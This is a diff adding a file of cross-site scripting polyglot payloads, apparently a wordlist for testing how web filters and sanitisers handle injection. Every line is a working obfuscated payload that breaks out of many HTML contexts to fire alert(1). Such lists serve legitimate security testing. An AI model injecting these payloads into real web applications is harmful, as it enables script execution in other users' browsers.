@@ -1,0 +1,27 @@
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert(1)//>
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert(1)//>
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert(1)//'>`
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert(1)//'>`
+javascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(1)//'">`
+javascript:"/*'//`//\"//</template/</title/</textarea/</style/</noscript/</noembed/</script/--><script>/&lt;i<frame */ onload=alert(1)//</script>
+javascript:"/*`/*\"/*'/*</stYle/</titLe/</teXtarEa/</nOscript></noembed></template></script/--><ScRipt>/*&lt;i<frame/*/ onload=alert(1)//</Script>
+javascript:`</template>\"///"//</script/--></title/'</style/</textarea/</noembed/</noscript>&lt;<script/>/<frame */; onload=alert(1)//&lt</script>`
+javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame &lt;svg"///*/ onload=alert(1)//</script>
+javascript:/*`//'//\"//</style></noscript></script>--></textarea></noembed></template></title><script>/<frame &lt;svg"///*/ onload=alert(1)//</script>
+javascript:/*"//'//`//\"//--></script></title></style></textarea></template></noembed></noscript><script>//<frame/&lt;svg/*/onload= alert(1)//</script>
+javascript:/*-->'//"//`//\"//</title></textarea></style></noscript></script></noembed></template><script>/*<frame/&lt;svg */ onload=alert(1)//</script>
+javascript:/*"/*'/*`/*\"/*</script/</title/</textarea/</style/</noscript></template></noembed>--><script>/*&lt;svg <frame */ onload=alert(1)//</script>
+javascript:/*"/*'/*\"/*`/*--></title></noembed></template></textarea></noscript></style></script><script>//<frame &lt;svg */ onload=alert(1)//</script>
+javascript:/*"/*`/*'/*\"/*--></title></script></textarea></noscript></style></noembed></template><script> /*&lt;svg <frame onload=/**/alert(1)//</script>
+javascript:"/*'//`//\"//</title></template/</textarea/</style/</noscript/</noembed/</script>-->&lt;<script>alert(1)&lt;</script><frame/*/ onload=alert(1)//>
+javascript:alert(1)"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//&lt;svg <frame */onload= alert(1)//</script>
+javascript:alert(1)"//</title></textarea></style></noscript></noembed></template></script>\"//'//`//--><script>//&lt;svg <frame */onload= alert(1)//</script>
+javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><frame/onload=alert(1)-->&lt;<svg/*/ onload=alert(1)//>
+javascript:"/*`/*\"/*' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(1)//-->&lt;<sVg/onload=alert(1)``>
+javascript:/*--></script></textarea></style></noscript>\"</noembed>[`</template>["</select>['</title>]&lt;<script>///<frame */ onload=alert(1)//&lt;</script>
+javascript:"/*\"/*'/*`/*--></noembed></template></noscript></title></textarea></style></script></select><frame/onload=alert(1)>&lt;<svg/onload= /**/alert(1)//>
+javascript:/*"/*`/*'/*\"/*--></title></textarea></noscript></noembed></template></style></script>&lt;<script> /**/alert(1)//&lt;</script><frame onload=alert(1)>
+javascript:"/*\"/*'/*--></title></textarea></style></noscript></template></noembed></script>&lt;<script>/*` /*<frame src=javascript:/**/alert(1)//>&lt;</script>
+javascript:{alert(1)}//*/javascript:javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload={alert(1)}onload={alert(1)}//><svg onload={alert(1)}><svg onload={alert(1)}>*/</style><script>{alert(1)}</script><style>
+-{alert(1)}//</style><svg/onload={alert(1)}//>/**/{alert(1)}//("-{alert(1)}-"///,\'-{alert(1)}-\'--><svg/onload={alert(1)}>\\x3csvg onload={alert(1)}\\x3e</textarea><svg/onload={alert(1)}//>/**/{alert(1)}//</script><script>{alert(1)}//function(){{{alert(1)}}}()*/{alert(1)}--><svg/onload={alert(1)}//>
